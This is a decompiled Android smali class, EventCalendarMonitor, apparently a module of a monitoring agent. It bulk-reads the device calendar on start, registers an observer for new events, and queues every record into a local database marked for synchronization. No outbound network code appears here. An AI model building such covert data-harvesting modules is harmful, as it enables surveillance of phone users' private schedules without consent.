.class public Lcom/hp/vd/module/monitor/EventCalendarMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "EventCalendarMonitor.java"


# static fields
.field public static final ATTRIBUTE_GATHER_ON_START:Ljava/lang/String; = "gather_on_start"

.field public static final ATTRIBUTE_MAX_ID:Ljava/lang/String; = "max_internal_id"

.field protected static final TAG:Ljava/lang/String; = "EventCalendarMonitor"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/EventCalendarData;",
            ">;"
        }
    .end annotation
.end field

.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

.field protected initialEventCalendarListerThread:Ljava/lang/Thread;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected monitoringStatus:Z

.field protected writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/QueueConsumerDao<",
            "Lcom/hp/vd/data/EventCalendarData;",
            ">;"
        }
    .end annotation
.end field

.field protected writerThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 24
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 31
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 32
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 33
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writerThread:Ljava/lang/Thread;

    .line 34
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->initialEventCalendarListerThread:Ljava/lang/Thread;

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    .line 37
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 39
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentResolver:Landroid/content/ContentResolver;

    .line 40
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentUri:Landroid/net/Uri;

    const/4 v0, 0x0

    .line 42
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->monitoringStatus:Z

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 1

    const/4 v0, 0x0

    .line 155
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentUri:Landroid/net/Uri;

    .line 156
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentResolver:Landroid/content/ContentResolver;

    .line 158
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 159
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 161
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 48
    const-class v0, Lcom/hp/vd/data/EventCalendarData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 53
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 55
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 56
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 57
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 58
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x2

    .line 59
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v2.0"

    .line 60
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data=text;"

    .line 62
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 63
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "max_internal_id=0;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 64
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "gather_on_start=true;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    const/16 v1, 0xcb

    .line 66
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 67
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 69
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "EventCalendarMonitor"

    return-object v0
.end method

.method public initialize()Z
    .locals 5

    .line 92
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "content://com.android.calendar/events"

    .line 98
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentUri:Landroid/net/Uri;

    .line 99
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentResolver:Landroid/content/ContentResolver;

    .line 106
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "EventCalendarMonitor"

    .line 108
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "initialize(): max_internal_id = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "max_internal_id"

    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const-string v1, "EventCalendarMonitor"

    .line 109
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "initialize(): gather_on_start = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "gather_on_start"

    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "EventCalendarMonitor"

    const-string v3, "initialize(): could not load persisted module data."

    .line 112
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 114
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 123
    :goto_0
    new-instance v1, Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1}, Lcom/hp/vd/data/concurrency/BlockingQueue;-><init>()V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    const/4 v1, 0x0

    .line 128
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1

    move-object v1, v2

    goto :goto_1

    :catch_1
    move-exception v2

    const-string v3, "EventCalendarMonitor"

    const-string v4, "initialize(): could not initialize dao."

    .line 131
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 134
    :goto_1
    new-instance v2, Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v2, v3, v1, v0}, Lcom/hp/vd/data/concurrency/QueueConsumerDao;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v2, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 137
    :try_start_2
    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_2
    .catch Ljava/sql/SQLException; {:try_start_2 .. :try_end_2} :catch_2

    const/4 v0, 0x1

    return v0

    :catch_2
    move-exception v1

    const-string v2, "EventCalendarMonitor"

    const-string v3, "initialize(): cannot get moduleDao."

    .line 140
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 v0, 0x0

    return v0
.end method

.method public install(Ljava/lang/String;)Z
    .locals 3

    .line 77
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "EventCalendarMonitor"

    const-string v2, "install() called."

    .line 78
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 80
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_0

    const/4 p1, 0x0

    return p1

    :cond_0
    const/16 p1, 0x4b

    .line 84
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    const/4 p1, 0x1

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 258
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->monitoringStatus:Z

    return v0
.end method

.method public start()Z
    .locals 11

    .line 169
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "EventCalendarMonitor"

    const-string v2, "start(): called."

    .line 170
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 172
    iget-boolean v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->active:Z

    const/4 v2, 0x0

    if-nez v1, :cond_0

    const-string v1, "EventCalendarMonitor"

    const-string v3, "This module is currently DEactivated."

    .line 173
    invoke-interface {v0, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v2

    .line 178
    :cond_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    if-nez v1, :cond_1

    const-string v1, "EventCalendarMonitor"

    const-string v3, "start(): writer is NULL."

    const/4 v4, 0x3

    .line 179
    invoke-interface {v0, v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2

    .line 184
    :cond_1
    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writerThread:Ljava/lang/Thread;

    const/4 v9, 0x1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v1

    if-ne v1, v9, :cond_3

    .line 185
    :cond_2
    new-instance v1, Ljava/lang/Thread;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const-string v3, "Writer-Queue-Audio"

    invoke-direct {v1, v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writerThread:Ljava/lang/Thread;

    .line 186
    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 189
    :cond_3
    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    if-nez v1, :cond_4

    .line 190
    new-instance v8, Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentUri:Landroid/net/Uri;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    move-object v1, v8

    move-object v7, v0

    invoke-direct/range {v1 .. v7}, Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;-><init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v8, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    .line 200
    :cond_4
    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "gather_on_start"

    invoke-virtual {v1, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-ne v1, v9, :cond_6

    .line 202
    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->initialEventCalendarListerThread:Ljava/lang/Thread;

    if-eqz v1, :cond_5

    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->initialEventCalendarListerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-nez v1, :cond_6

    .line 203
    :cond_5
    new-instance v10, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentUri:Landroid/net/Uri;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    move-object v1, v10

    move-object v8, v0

    invoke-direct/range {v1 .. v8}, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;-><init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    .line 213
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "EventCalendar-Initial-Lister-Thread"

    invoke-direct {v1, v10, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->initialEventCalendarListerThread:Ljava/lang/Thread;

    .line 214
    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->initialEventCalendarListerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 218
    :cond_6
    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentUri:Landroid/net/Uri;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    invoke-virtual {v1, v2, v9, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    const-string v1, "EventCalendarMonitor"

    const-string v2, "start(): EventCalendar content observer was registered."

    .line 224
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 226
    iput-boolean v9, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->monitoringStatus:Z

    return v9
.end method

.method public stop()Z
    .locals 3

    .line 234
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "EventCalendarMonitor"

    const-string v2, "stop(): called."

    .line 235
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 237
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentResolver:Landroid/content/ContentResolver;

    if-eqz v0, :cond_0

    .line 238
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    invoke-virtual {v0, v1}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    const/4 v0, 0x0

    .line 239
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    .line 242
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    .line 243
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 246
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->initialEventCalendarListerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    .line 247
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->initialEventCalendarListerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_2
    const/4 v0, 0x0

    .line 250
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/EventCalendarMonitor;->monitoringStatus:Z

    const/4 v0, 0x1

    return v0
.end method
